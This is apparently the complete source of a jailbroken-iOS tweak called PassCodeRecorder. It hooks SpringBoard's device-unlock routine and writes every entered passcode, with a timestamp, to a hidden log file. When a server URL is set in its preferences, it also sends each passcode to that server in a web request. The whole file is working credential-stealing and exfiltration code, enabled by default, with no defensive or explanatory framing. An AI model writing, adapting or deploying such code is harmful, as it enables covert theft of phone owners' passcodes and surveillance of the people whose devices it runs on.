#import <SpringBoard/SpringBoard.h>
#import <UIKit/UIKit.h>

static NSString *PasscodeRecLog = @"/var/mobile/Documents/PassCodeRecorderLog.txt";

%hook SBDeviceLockController
- (_Bool)attemptDeviceUnlockWithPassword:(id)arg1 appRequested:(_Bool)arg2{

    NSDictionary *prefs = [NSDictionary dictionaryWithContentsOfFile:[NSString stringWithFormat:@"/var/mobile/Library/Preferences/com.i0sa.passcoderecorderprefs.plist"]];
    BOOL enabled = [prefs objectForKey:@"enabled"] == nil ? YES : [[prefs objectForKey:@"enabled"] boolValue];
    if(enabled){

	/** Storing to file **/
	NSDateFormatter *dateFormatter=[[NSDateFormatter alloc] init]; 
	[dateFormatter setDateFormat:@"yyyy-MM-dd hh:mm:ss"];  
	NSString *date = [NSString stringWithFormat:@"[%@] - %@\n", [dateFormatter stringFromDate:[NSDate date]], arg1];
		

	NSFileHandle *myHandle = [NSFileHandle fileHandleForWritingAtPath:PasscodeRecLog];
	[myHandle seekToEndOfFile];
	[myHandle writeData:[date dataUsingEncoding:NSUTF8StringEncoding]];


	/** Send to server **/
	NSString *requestUrl = [prefs objectForKey:@"requestUrl"] ? [prefs objectForKey:@"requestUrl"] : nil;
	if(requestUrl){
		NSURLRequest *request = [[NSURLRequest alloc] initWithURL:[NSURL URLWithString:
		[NSString stringWithFormat:@"%@%@" ,requestUrl, arg1]]];
	
		[[[NSURLConnection alloc] initWithRequest:request delegate:self] autorelease];
	  }

     }

	return %orig;
}

%end



%ctor {
   
   if (![[NSFileManager defaultManager] fileExistsAtPath:PasscodeRecLog]){ 
	  	NSString *content = @"\n";
	    [content writeToFile:PasscodeRecLog 
	                     atomically:NO 
	                           encoding:NSStringEncodingConversionAllowLossy 
	                                  error:nil]; 
    }
         
}
